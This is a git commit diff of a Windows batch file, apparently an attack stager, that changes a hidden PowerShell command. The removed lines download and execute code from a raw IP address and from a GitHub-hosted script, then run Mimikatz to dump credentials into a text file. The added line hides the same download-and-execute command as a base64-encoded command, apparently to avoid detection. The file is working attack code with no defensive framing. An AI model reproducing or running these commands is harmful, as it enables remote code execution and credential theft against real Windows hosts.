03c40bc14b8aa795720975d40adee0a62c286477
ofswbug <72555151+ofswbug@users.noreply.github.com>
2021-10-21 18:07:55 +0300

    Update b.bat

--- b.bat
+++ b.bat
@@ -1,4 +1,2 @@
-C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -w hidden "IEX (New-Object Net.WebClient).DownloadString('http://52.29.134.186:80/index.php');"
+C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -w hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANQAyAC4AMgA5AC4AMQAzADQALgAxADgANgA6ADgAMAAvAGkAbgBkAGUAeAAuAHAAaABwACcAKQA7AA==
 whoami > C:\users\tomcat\desktop\who.txt
-C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -w hidden -C $objXmlHttp = New-Object -ComObject MSXML2.ServerXMLHTTP; $objXmlHttp.Open("GET", "https://github.com/ofswbug/a/blob/main/Invoke-memelon.ps1?raw=true", $False);  $objXmlHttp.Send(); $objXmlHttp.responseText | iex; Invoke-mimikatz -DumpCreds > c:\users\tomcat\desktop\creds.txt
-C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -w hidden -C $objXmlHttp = New-Object -ComObject MSXML2.ServerXMLHTTP; $objXmlHttp.Open("GET", "http://52.29.134.186:80/index.php", $False);  $objXmlHttp.Send(); $objXmlHttp.responseText | iex; 
